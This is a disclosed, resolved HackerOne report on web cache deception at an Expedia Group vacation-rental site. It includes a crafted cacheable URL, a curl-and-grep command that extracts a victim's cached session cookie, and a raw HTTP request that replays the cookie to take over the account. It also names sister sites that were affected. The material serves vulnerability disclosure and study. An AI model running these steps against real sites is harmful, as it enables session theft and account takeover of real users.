---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/use-of-cache-containing-sensitive-information
  - env/web
  - vuln/xss
  - impact/account-takeover
substate: "resolved"
weakness: "Use of Cache Containing Sensitive Information"
enriched: true
body: true
date: 2023-04-01
submitted: 2022-09-12T17:16:10.284Z
bounty_usd: null
votes: 160
cve: []
program: "[[programs/expediagroup_bbp|Expedia Group Bug Bounty]]"
reporter: "bombon"
source: "https://hackerone.com/reports/1698316"
title: "Cache Deception Allows Account Takeover"
---
# Cache Deception Allows Account Takeover

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 160 | **Program:** Expedia Group Bug Bounty | **Disclosed:** 2023-04-01

- Report: [https://hackerone.com/reports/1698316](https://hackerone.com/reports/1698316)
- CWE: Use of Cache Containing Sensitive Information
- Submitted: 2022-09-12T17:16:10.284Z

## Report summary

I was able to Takeover Accounts via Cache Deception

This was possible due to:

1. The Session Token was reflected on https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/{anything} and the server was responding with a 200 Ok (200 Ok responses allows the cache to last a lot longer than any other response)

2. The Caching Server sees https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/cached.jpeg as a "cacheable" response, due to `jpeg` extension at the end of the URL, the server will save it


Team fixed this by removing the Session Token from all pages, which is what I now recommend for all programs.

[X](https://twitter.com/bxmbn)

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access  the `ha.crumb` token located in  `/traveler/profile/edit` 


```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```


## Steps To Reproduce:

Victim Steps:

1->Visit https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis

Attacker Steps:

1->Visit the same URL using any other browser or do 

```curl 'https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis' --compressed | grep -i 'HASESSIONV3'```

{F1923081}


2-> use the token 

```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```

and look for the `ha.crumb` variable in the response




## Recommended Remediation Steps 
  1. Add cache rules for certain all cacheable extensions

## Impact

Account Takeover

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **2022-09-13** @bombon: If you will be closing the other report as duplicate, you should at least triage this as Critical.
- **2022-09-13** @bombon: I know the fix they will apply and it will not be enough, as it will need to sanitize the cookie anyways (if the app is behind akamai, The fix is almost the same on any other akamai application)
- **2022-09-13** @bombon: The team has a terrible resolution time

And I will have to send the XSS Report probably the next year.

At least triage the original report as Critical??
- **2022-09-13** @bombon: By the way this also works on


bookabach.co.nz

fewo-direkt.de

	
stayz.com.au

Please reconsider the Severity and #1698328
- **Report Needs More Info**
- **Report New**
- **2022-09-15** @bombon: Download the Video If necessary
- **2022-09-15** @bombon: Since you closed the XSS report as duplicate of this report

Here is a PoC Video to reproduce the Stored XSS, but hope you triage this as Critical as both ways an attacker can perform ATO

{F1928820}
- **2022-09-16** @h1_analyst_decimo: Thanks for reaching out, @bombon.

Neither of these reports can be assessed as "Critical" as both require user interaction. I will forward your video proof-of-concept to the team

Cheers,
@still
- **Report Vulnerability Types Updated**
- **2022-09-16** @bombon: Then reopen the other report?
- **2022-10-03** @bombon: Please let me know if you are having trouble reproducing this report

According to the policy, this should have been triaged already
- **Report Triaged**
- **2022-10-03** @bombon: Hope this qualify for a bonus or Triaged it as Crticial, as this also could lead to STORED XSS and account takeover is imminent
- **Bounty Awarded**
- **2022-10-12** @bombon: Any bonus?
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
